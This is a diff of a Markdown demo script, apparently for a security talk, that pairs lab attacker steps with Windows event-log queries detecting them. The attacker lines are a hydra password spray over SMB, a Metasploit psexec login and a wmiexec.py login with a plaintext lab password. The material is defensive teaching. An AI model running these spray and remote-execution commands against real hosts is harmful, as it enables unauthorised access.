@@ -1,6 +1,6 @@
 # Demo
 
-## Password spray
+## Attacker launches password spray
 **Attacker**:
 
 Password spray: `hydra -L users.txt -P seasons-2023.txt 192.168.37.237 smb -u`
@@ -11,7 +11,7 @@ Password spray: `hydra -L users.txt -P seasons-2023.txt 192.168.37.237 smb -u`
 
 `Get-WinEvent -Path C:\labs\valkyrie-security-logons.evtx | Group-Object id -NoElement | sort count`
 
-## Use sprayed credentials to log in via Metasplot's psexec
+## Attacker uses sprayed credentials to log in via Metasplot's psexec
 
 **Attacker**
 
@@ -23,10 +23,19 @@ Service was created (before Defender killed it):
 
 `Get-WinEvent @{Path="C:\labs\valkyrie-system.evtx"; ID=7045}| fl`
 
+Command was executed (event 4688):
+
+`Get-WinEvent @{Path="C:\labs\valkyrie-security.evtx";id=4688}| Where {$_.Message -like "*powershell.exe -nop*"} | fl`
+
 Windows Defender Antivirus killed the connection:
 
 `Get-WinEvent @{Path="C:\labs\valkyrie-defender.evtx";id=1117} | fl`
 
+## Attacker logs in with wmiexec.py:
+
+`wmiexec.py fgaeta:W1nter2023\!@192.168.37.237`
+
+<img width="558" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/8d7f5896-91be-41d1-9b31-ac312b38ddd4">
 
 
 ## afaef
